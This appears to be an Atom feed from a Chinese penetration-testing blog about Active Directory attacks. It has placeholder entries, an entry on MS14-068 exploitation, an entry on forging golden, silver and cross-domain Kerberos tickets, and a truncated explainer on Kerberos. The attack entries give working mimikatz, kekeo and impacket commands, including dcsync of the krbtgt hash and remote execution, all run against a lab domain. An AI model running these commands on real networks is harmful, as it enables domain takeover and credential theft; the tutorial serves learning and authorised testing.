<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Se7en&#39;s Blog|专注渗透测试。</title>
  
  
  <link href="https://www.se7ensec.cn/atom.xml" rel="self"/>
  
  <link href="https://www.se7ensec.cn/"/>
  <updated>2021-11-02T16:07:07.979Z</updated>
  <id>https://www.se7ensec.cn/</id>
  
  <author>
    <name>Se7en</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>域渗透|域内权限维持</title>
    <link href="https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <id>https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</id>
    <published>2021-11-01T14:10:24.000Z</published>
    <updated>2021-11-02T16:07:07.979Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>域内权限维持</p></blockquote><a id="more"></a><p>填坑</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;域内权限维持&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="域渗透" scheme="https://www.se7ensec.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>域渗透|SPN与Kerberoasting攻击</title>
    <link href="https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-SPN%E4%B8%8EKerberoasting%E6%94%BB%E5%87%BB/"/>
    <id>https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-SPN%E4%B8%8EKerberoasting%E6%94%BB%E5%87%BB/</id>
    <published>2021-11-01T13:10:24.000Z</published>
    <updated>2021-11-02T16:04:32.285Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>SPN与Kerberoasting攻击</p></blockquote><a id="more"></a><p>填坑</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;SPN与Kerberoasting攻击&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="域渗透" scheme="https://www.se7ensec.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>域渗透|Delegation</title>
    <link href="https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-Delegation/"/>
    <id>https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-Delegation/</id>
    <published>2021-11-01T12:10:24.000Z</published>
    <updated>2021-11-02T15:46:40.954Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Delegation（委派）</p></blockquote><a id="more"></a><p>填坑</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Delegation（委派）&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="域渗透" scheme="https://www.se7ensec.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>域渗透|Relay</title>
    <link href="https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-Relay/"/>
    <id>https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-Relay/</id>
    <published>2021-11-01T11:10:24.000Z</published>
    <updated>2021-11-02T15:46:33.971Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Relay（中继）</p></blockquote><a id="more"></a><p>填坑</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Relay（中继）&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="域渗透" scheme="https://www.se7ensec.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>域渗透|MS14-068</title>
    <link href="https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068/"/>
    <id>https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068/</id>
    <published>2021-11-01T10:20:24.000Z</published>
    <updated>2022-01-05T16:12:37.392Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>MS14-068</p></blockquote><a id="more"></a><h1 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h1><p><code>MS14068</code>是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。</p><p>这个漏洞中主要的问题是存在于<code>KDC</code>会根据客户端指定<code>PAC</code>中数字签名的加密算法，以及<code>PAC</code>的加密算法，来校验<code>PAC</code>的合法性。这使得攻击者可通过伪造<code>PAC</code>，修改<code>PAC</code>中的<code>SID</code>，导致<code>KDC</code>判断攻击者为高权限用户，从而导致权限提升漏洞的产生。</p><p>漏洞补丁地址: <a href="https://technet.microsoft.com/zh-cn/library/security/MS14-068">https://technet.microsoft.com/zh-cn/library/security/MS14-068</a></p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p><code>MS14-068</code>对应的补丁为<code>KB3011780</code>，可在域控上通过<code>systeminfo</code>查看是否安装此补丁。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo|find <span class="string">&quot;3011780&quot;</span></span><br></pre></td></tr></table></figure><h2 id="keoko"><a href="#keoko" class="headerlink" title="keoko"></a>keoko</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">klist purge清除票据</span><br><span class="line">kekeo <span class="string">&quot;exploit::ms14068 /domain:rootkit.org /user:sqladmin /password:Admin12345 /ptt&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Pykek"><a href="#Pykek" class="headerlink" title="Pykek"></a>Pykek</h2><blockquote><p>py：<a href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a><br>exe：<a href="https://github.com/ianxtianxt/MS14-068">https://github.com/ianxtianxt/MS14-068</a></p></blockquote><p>参数说明：</p><blockquote><p>-u 域账号@域名称<br>-p 为当前用户的密码<br>-s 为当前用户的SID值，可以通过whoami/all来获取用户的SID值<br>-d 为当前域的域控<br>–rc4 为当前用户的Hash</p></blockquote><ol><li>通过dir来访问域控的共享文件夹，提示拒绝访问。<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\OWA2013.rootkit.org\c<span class="variable">$</span></span><br></pre></td></tr></table></figure></li><li>生成票据<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14<span class="literal">-068</span>.exe <span class="literal">-u</span> sqladmin@rootkit.org <span class="literal">-p</span> Admin12345 <span class="literal">-s</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-3759881954</span><span class="literal">-2993291187</span><span class="literal">-3577547808</span><span class="literal">-1613</span> <span class="literal">-d</span> OWA2013.rootkit.org</span><br></pre></td></tr></table></figure></li><li>脚本执行成功会在当前目录下生成一个<code>ccache</code>文件，票据导入之前cmd下使用命令<code>klist purge</code>，或者在<code>mimikatz</code>中使用<code>kerberos::purge</code>删除当前缓存的<code>kerberos</code>票据。<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure></li><li>使用mimikatz导入生成的<code>ccache</code>文件<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;kerberos::ptc TGT_sqladmin@rootkit.org.ccache&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>再次dir访问域控共享就可以成功访问。<h2 id="goldenPac"><a href="#goldenPac" class="headerlink" title="goldenPac"></a>goldenPac</h2></li></ol><p>impacket工具包里面的goldenPac.py，这个工具是结合<code>ms14-068</code>加<code>psexec</code>的产物，利用起来十分顺手。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python goldenPac.py <span class="literal">-dc</span><span class="literal">-ip</span> <span class="number">192.168</span>.<span class="number">3.144</span> <span class="literal">-target</span><span class="literal">-ip</span> <span class="number">192.168</span>.<span class="number">3.144</span> rootkit.org/sqladmin:Admin12345@OWA2013.rootkit.org</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2014/ms14-068">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2014/ms14-068</a><br><a href="https://daiker.gitbook.io/windows-protocol/kerberos/3#0x00-qian-yan">https://daiker.gitbook.io/windows-protocol/kerberos/3#0x00-qian-yan</a><br><a href="https://cloud.tencent.com/developer/article/1760132">https://cloud.tencent.com/developer/article/1760132</a><br><a href="https://www.cnblogs.com/backlion/p/6820744.html">https://www.cnblogs.com/backlion/p/6820744.html</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;MS14-068&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="域渗透" scheme="https://www.se7ensec.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>域渗透|票据伪造</title>
    <link href="https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0/"/>
    <id>https://www.se7ensec.cn/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0/</id>
    <published>2021-11-01T10:10:24.000Z</published>
    <updated>2022-01-04T18:11:03.041Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>票据伪造</p></blockquote><a id="more"></a><h1 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h1><h2 id="GoldenTicket"><a href="#GoldenTicket" class="headerlink" title="GoldenTicket"></a>GoldenTicket</h2><p><a href="https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE">https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE</a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p><h3 id="制作金票的条件"><a href="#制作金票的条件" class="headerlink" title="制作金票的条件"></a>制作金票的条件</h3><blockquote><p>1、域名称<br>2、域的SID值<br>3、域的KRBTGT账户密码HASH<br>4、伪造用户名，可以是任意的</p></blockquote><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>金票的生成需要用到<code>krbtgt</code>的密码<code>HASH</code>值，可以通过<code>mimikatz</code>中的命令获取<code>krbtgt</code>的值。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /OWA2013.rootkit.org /user:krbtgt</span><br></pre></td></tr></table></figure><p>得到<code>KRBTGT HASH</code>之后使用mimikatz中的<code>kerberos::golden</code>功能生成金票<code>golden.kiribi</code>，即为伪造成功的<code>TGT</code>。</p><blockquote><p>/user：伪造的用户名<br>/domain：域名称<br>/sid：SID值，<strong>注意是去掉最后一个-后面的值</strong><br>/krbtgt：krbtgt的HASH值<br>/ptt：表示的是Pass The Ticket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::golden /user:administrator /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /krbtgt:c3d5042c67ef5f461d0ba6ecdd9ea449 /ptt&quot;</span> <span class="keyword">exit</span></span><br><span class="line">klist / kerberos::list列出当前的所有票据</span><br></pre></td></tr></table></figure><p>此时就可以通过<code>dir</code>成功访问域控的共享文件夹。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\OWA2013.rootkit.org\c<span class="variable">$</span></span><br></pre></td></tr></table></figure><h4 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 清空票据</span><br><span class="line">klist purge</span><br><span class="line"><span class="number">2</span>. 制作ccache文件</span><br><span class="line">python ticketer.py <span class="literal">-nthash</span> c3d5042c67ef5f461d0ba6ecdd9ea449 <span class="literal">-domain</span><span class="literal">-sid</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-3759881954</span><span class="literal">-2993291187</span><span class="literal">-3577547808</span> <span class="literal">-domain</span> rootkit.org administrator</span><br><span class="line"><span class="number">3</span>. 更改环境变量</span><br><span class="line"><span class="built_in">set</span> KRB5CCNAME=administrator.ccache / export KRB5CCNAME=administrator.ccache</span><br><span class="line"><span class="number">4</span>. 验证成果</span><br><span class="line">python wmiexec.py rootkit.org/administrator@OWA2013 <span class="literal">-k</span> <span class="literal">-no</span><span class="literal">-pass</span></span><br></pre></td></tr></table></figure><h1 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h1><h2 id="SilverTickets"><a href="#SilverTickets" class="headerlink" title="SilverTickets"></a>SilverTickets</h2><p><a href="https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE">https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE</a></p><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给<br>Client授权的服务（通过SID的值），所以银票只能访问指定服务。</p><h3 id="制作银票的条件"><a href="#制作银票的条件" class="headerlink" title="制作银票的条件"></a>制作银票的条件</h3><blockquote><p>1、域名称<br>2、域SID<br>3、目标服务器的FQDN（Fully Qualified Domain Name全限定域名，即同时带有主机名和域名的名称。）<br>4、可利用的服务（运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等）<br>5、服务账号的NTLM Hash（如果是域控制器机器账号，那就代表DC已经被拿下了）<br>6、需要伪造的用户名，可以是任意的，这里是silver</p></blockquote><h3 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h3><h4 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>首先我们需要知道<code>服务账户</code>的<code>密码HASH</code>，这里同样拿域控来举例（注意，这里使用的不是<code>Administrator</code>账号的<code>HASH</code>，而是<code>OWA2013$</code>的）</p><p>参数说明：</p><blockquote><p>/domain：当前域名称<br>/sid：SID值，和金票一样取前面一部分<br>/target：目标主机，这里是OWA2013.rootkit.org<br>/service：服务名称，这里需要访问共享文件，所以是cifs<br>/rc4：服务账户的<code>NTLM HASH </code>值 (<code>OWA2013$</code>)<br>/user：伪造的用户名<br>/ptt：表示的是Pass The Ticket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用</p></blockquote><p>用kerberos::ptt来导入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 伪造 cifs 服务权限</span><br><span class="line">mimikatz <span class="string">&quot;kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /target:OWA2013.rootkit.org /service:cifs /rc4:ddd2162e8606006dcca0e29b7819721a /user:silver /ptt&quot;</span> <span class="keyword">exit</span></span><br><span class="line">klist</span><br><span class="line"><span class="built_in">dir</span> \\OWA2013.rootkit.org\c<span class="variable">$</span></span><br><span class="line"><span class="number">2</span>. 伪造 LDAP 服务权限</span><br><span class="line">mimikatz <span class="string">&quot;kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /target:OWA2013.rootkit.org /service:LDAP /rc4:ddd2162e8606006dcca0e29b7819721a /user:silver /ptt&quot;</span> <span class="keyword">exit</span></span><br><span class="line">klist</span><br><span class="line">mimikatz <span class="string">&quot;lsadump::dcsync /dc:OWA2013.rootkit.org /domain:rootkit.org /user:krbtgt&quot;</span> <span class="keyword">exit</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="impacket-1"><a href="#impacket-1" class="headerlink" title="impacket"></a>impacket</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 伪造 cifs 服务权限</span><br><span class="line">python3 ticketer.py <span class="literal">-nthash</span> ddd2162e8606006dcca0e29b7819721a <span class="literal">-domain</span><span class="literal">-sid</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-3759881954</span><span class="literal">-2993291187</span><span class="literal">-3577547808</span> <span class="literal">-domain</span> rootkit.org <span class="literal">-dc</span><span class="literal">-ip</span> <span class="number">192.168</span>.<span class="number">3.144</span> <span class="literal">-spn</span> cifs/OWA2013.rootkit.org silver</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. 伪造 LDAP 服务权限</span><br><span class="line">python3 ticketer.py <span class="literal">-nthash</span> ddd2162e8606006dcca0e29b7819721a <span class="literal">-domain</span><span class="literal">-sid</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-3759881954</span><span class="literal">-2993291187</span><span class="literal">-3577547808</span> <span class="literal">-domain</span> rootkit.org <span class="literal">-dc</span><span class="literal">-ip</span> <span class="number">192.168</span>.<span class="number">3.144</span> <span class="literal">-spn</span> ldap/OWA2013.rootkit.org silver</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> KRB5CCNAME=silver.ccache / export KRB5CCNAME=silver.ccache</span><br><span class="line">python wmiexec.py <span class="literal">-k</span> OWA2013.rootkit.org</span><br></pre></td></tr></table></figure><h1 id="增强版的黄金票据"><a href="#增强版的黄金票据" class="headerlink" title="增强版的黄金票据"></a>增强版的黄金票据</h1><h2 id="EnhancedGolden-Tickets"><a href="#EnhancedGolden-Tickets" class="headerlink" title="EnhancedGolden Tickets"></a>EnhancedGolden Tickets</h2><p>在<code>Golden Ticket</code>部分说明可利用<code>krbtgt</code>的<code>密码HASH</code>值生成金票，从而能够获取域控权限同时能够访问域内其他主机的任何服务。</p><p>但是<strong>普通的金票不能够跨域使用</strong>，也就是说金票的权限被限制在当前域内。</p><h3 id="域树与域林"><a href="#域树与域林" class="headerlink" title="域树与域林"></a>域树与域林</h3><p><code>NEWS.rootkit.org</code>和 <code>DEV.rootkit.org</code> 均为<code>rootkit.org</code>的子域，这三个域组成了一个域树。</p><p>同样<code>test.org</code>也是一个单独的域树，<strong>两个域树</strong> <code>rootkit.org</code> 和<code> test.org</code> 组合起来被称为一个<strong>域林</strong>。</p><h3 id="普通金票的局限性"><a href="#普通金票的局限性" class="headerlink" title="普通金票的局限性"></a>普通金票的局限性</h3><p>根域和其他域的最大的区别就是根域对整个域林都有控制权。</p><p>而域正是根据<code>Enterprise Admins</code>组来实现这样的权限划分。</p><h4 id="Enterprise-Admins组"><a href="#Enterprise-Admins组" class="headerlink" title="Enterprise Admins组"></a>Enterprise Admins组</h4><p><code>EnterpriseAdmins</code>组是域中用户的一个组，<strong>只存在于一个林中的根域中</strong>，这个组的成员，这里也就是<code>rootkit.org</code>中的<code>Administrator</code>用户（<strong>不是本地的Administrator，是域中的Administrator</strong>）对域有<strong>完全管理控制权</strong>。</p><p><code>rootkit.org</code>的域控上<code>Enterprise Admins</code>组的<code>RID</code>为<code>519</code>。</p><h4 id="Domain-Admins组"><a href="#Domain-Admins组" class="headerlink" title="Domain Admins组"></a>Domain Admins组</h4><p>子域中是<strong>不存在</strong><code>EnterpriseAdmins</code>组的，在一个<strong>子域中权限最高的组</strong>就是<code>Domain Admins</code>组。</p><p><code>NEWS.rootkit.org</code>这个子域中的<code>Administrator</code>用户，这个<code>Administrator</code>只有当前域的最高权限。</p><h3 id="利用过程-2"><a href="#利用过程-2" class="headerlink" title="利用过程"></a>利用过程</h3><h4 id="mimikatz-2"><a href="#mimikatz-2" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>普通的黄金票据被限制在当前域内，在<code>2015</code>年<code>Black Hat USA</code>中国外的研究者提出了<strong>突破域限制的增强版的黄金票据</strong>。</p><p>通过域内主机在迁移时<code>LDAP</code>库中的<code>SIDHistory</code>属性中保存的上一个域的<code>SID</code>值制作<strong>可以跨域的金票</strong>。</p><p>如果知道<strong>根域</strong>的<code>SID</code>那么就可以通过<strong>子域</strong>的<code>KRBTGT</code>的<code>HASH</code>值，使用<code>mimikatz</code>创建具有<code>EnterpriseAdmins</code>组权限（域林中的最高权限）的票据。</p><p>然后通过<code>mimikatz</code>重新生成包含<code>根域SID</code>的新的金票</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;kerberos::golden /admin:administrator /domain:news.rootkit.org` /sid:子域sid /sids:根域sids /krbtgt:子域krbtgt的hash /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>参考：<a href="https://adsecurity.org/?p=1640">https://adsecurity.org/?p=1640</a></p><p><code>Startoffffset</code>和<code>endin</code>分别代表偏移量和长度，<code>renewmax</code>表示生成的票据的最长时间。</p><p>注意这里是不知道根域<code>rootkit.org</code>的<code>krbtgt</code>的密码<code>HASH</code>的，使用的是子域<code>NEWS.rootkit.org</code>中的<code>KRBTGT</code>的密码<code>HASH</code>。</p><p>然后就可以通过<code>dir</code>访问<code>OWA2013.rootkit.org</code>的共享文件夹，此时的这个票据是拥有整个域林的控制权的。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/uknowsec/Active-Directory-Pentest-Notes">https://github.com/uknowsec/Active-Directory-Pentest-Notes</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;票据伪造&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="域渗透" scheme="https://www.se7ensec.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>域渗透|Kerberos域认证机制剖析</title>
    <link href="https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/"/>
    <id>https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/</id>
    <published>2021-10-20T10:10:24.000Z</published>
    <updated>2021-11-02T15:21:33.530Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Kerberos域认证机制剖析</p></blockquote><a id="more"></a><h1 id="Kerberos概念"><a href="#Kerberos概念" class="headerlink" title="Kerberos概念"></a>Kerberos概念</h1><p>Kerberos是一种网络认证协议，其设计目标是通过密钥系统为<code>Client / Server</code>应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。</p><p>在以上情况下， Kerberos作为一种可信任的第三方认证服务，是通过传统的密码技术(如:共享 密钥)执行认证服务的。</p><h1 id="域认证所参与的角色"><a href="#域认证所参与的角色" class="headerlink" title="域认证所参与的角色"></a>域认证所参与的角色</h1><blockquote><p>Kerberos的标志是三只狗头，狗头分别代表以下三个角色</p></blockquote><ul><li><ol><li>访问服务的Client</li></ol></li><li><ol start="2"><li>提供服务的Server</li></ol></li><li><ol start="3"><li>KDC（Key Distribution Center）密钥分发中心 kerberos 测试工具介绍</li></ol></li></ul><p>其中KDC服务默认会安装在一个域的域控中，而<code>Client</code>和<code>Server</code>为域内的用户或者是服务，如<code>HTTP服务</code>，<code>SQL服务</code>。在<code>Kerberos</code>中<code>Client</code>是否有权限访问<code>Server</code>端的服务由<code>KDC(Key Distribution Center)</code>发放的票据来决定。</p><h1 id="Kerberos认证协议"><a href="#Kerberos认证协议" class="headerlink" title="Kerberos认证协议"></a>Kerberos认证协议</h1><h2 id="TGT（Ticket-Granting-Ticket）"><a href="#TGT（Ticket-Granting-Ticket）" class="headerlink" title="TGT（Ticket Granting Ticket）"></a>TGT（Ticket Granting Ticket）</h2><blockquote><p>由身份认证服务<code>AS(Authentication Service)</code>授予的票据，<code>TGT</code>用于身份认证，存储在内存，<strong>默认有效期为10小时</strong>，通过<code>TGT</code>能够获得<code>票据（Ticket）</code>，<code>TGT</code>是一种 <strong>临时凭证</strong> 的存在，<code>伪造的TGT</code>又被称为 <strong>黄金票据</strong>。</p></blockquote><h2 id="票据（Server-Ticket-Ticket）"><a href="#票据（Server-Ticket-Ticket）" class="headerlink" title="票据（Server Ticket/Ticket）"></a>票据（Server Ticket/Ticket）</h2><blockquote><p>是网络对象互相访问的 <strong>凭证</strong>，<code>伪造的ST\Ticket</code>又被称为 <strong>白银票据</strong>。</p></blockquote><h2 id="KDC-Key-Distribution-Center"><a href="#KDC-Key-Distribution-Center" class="headerlink" title="KDC(Key Distribution Center)"></a>KDC(Key Distribution Center)</h2><blockquote><p>负责管理票据、认证票据、分发票据，但是<code>KDC</code>不是一个独立的服务，它由以下服务组成：</p></blockquote><ul><li><strong>AS(Authentication Service)</strong>: 身份认证服务，为<code>Client</code>生成<code>TGT(Ticket Granting Ticket)</code>的服务。</li><li><strong>TGS(Ticket Granting Service)</strong>: 票据授予服务，为<code>Client</code>生成某个服务的<code>Ticket</code>的服务。</li></ul><h2 id="AD-Account-Database"><a href="#AD-Account-Database" class="headerlink" title="AD(Account Database)"></a>AD(Account Database)</h2><blockquote><p>一个类似于本机<code>SAM</code>的一个数据库，存储所有<code>Client</code>的白名单，只有存在于白名单的<code>Client</code>才能顺利申请到<code>TGT</code>。</p></blockquote><p><strong>※补充：从物理层面看，AD与KDC均为域控制器(Domain Controller)。</strong></p><h1 id="域认证粗略流程"><a href="#域认证粗略流程" class="headerlink" title="域认证粗略流程"></a>域认证粗略流程</h1><h2 id="过程简述"><a href="#过程简述" class="headerlink" title="过程简述"></a>过程简述</h2><p>①-②：<code>Client</code>向<code>kerberos</code>服务请求，希望获取访问<code>Server</code>的权限。 <code>kerberos</code>得到了这个消息，首先得判断<code>Client</code>是否是可信赖的， 也就是白名单黑名单的说法。</p><p>这就是<code>AS(Authentication 